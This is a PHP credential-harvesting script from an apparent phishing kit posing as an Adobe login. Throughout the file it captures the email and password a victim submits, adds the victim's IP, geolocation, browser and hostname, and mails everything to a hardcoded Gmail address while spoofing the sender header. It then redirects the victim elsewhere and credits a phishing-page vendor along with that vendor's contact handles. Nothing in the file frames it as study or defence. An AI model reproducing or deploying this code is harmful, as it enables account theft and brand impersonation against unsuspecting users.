<?
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------Ad0be Info-----------------------\n";
$message .= "Email Address            : ".$_POST['email']."\n";
$message .= "Password            : ".$_POST['password']."\n";
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "---------------Created BY fudpages(doit)com-------------\n";
//change ur email here
$send = "andreagauding001@gmail.com";
$subject = "Result from Ad0be";
$headers = "From: Ad0be<supertool@mxtoolbox.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);

 }
    header("Location: https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwiktYTV3s7RAhUJtxQKHQ7tCvEQFggZMAA&url=http%3A%2F%2Fwww.eharmony.com%2Fdating-advice%2Fusing-eharmony%2Fnew-feature-relyid%2F&usg=AFQjCNEqocrtgCqX13oNa-mcBVSrTSP60w&sig2=ZPeHHpPDXjeSZb9bNpG7qQ");
  

?>
<?php
/* create by Fudpages.com skype fud.pages
Yahoo fudpages
ICQ 688832679
jabbar fud.pages@exploit.im
http://fudpages.com
*/
?>